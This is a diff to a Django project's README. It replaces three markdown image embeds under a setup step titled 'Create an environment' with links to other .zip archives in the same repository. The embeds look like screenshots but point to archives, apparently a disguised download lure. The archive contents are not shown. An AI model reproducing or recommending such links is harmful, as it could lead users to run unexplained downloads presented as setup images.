@@ -22,9 +22,9 @@ Djoser TOKEN:
 http://127.0.0.1:8000/auth/token/login/
 
 ## Main Steps
-1. **Create an environment:**![django8](https://raw.githubusercontent.com/rahuldounde21/Django-Meta-Assessment-/master/lux/Django-Meta-Assessment-.zip)
-![django7](https://raw.githubusercontent.com/rahuldounde21/Django-Meta-Assessment-/master/lux/Django-Meta-Assessment-.zip)
-![django](https://raw.githubusercontent.com/rahuldounde21/Django-Meta-Assessment-/master/lux/Django-Meta-Assessment-.zip)
+1. **Create an environment:**![django8](https://github.com/rahuldounde21/Django-Meta-Assessment-/raw/refs/heads/master/Django-Meta-Assessment-main/restaurant/Meta_Assessment_Django_3.0.zip)
+![django7](https://github.com/rahuldounde21/Django-Meta-Assessment-/raw/refs/heads/master/Django-Meta-Assessment-main/restaurant/Meta_Assessment_Django_3.0.zip)
+![django](https://github.com/rahuldounde21/Django-Meta-Assessment-/raw/refs/heads/master/Django-Meta-Assessment-main/restaurant/Meta_Assessment_Django_3.0.zip)
 
 
     **Windows:**
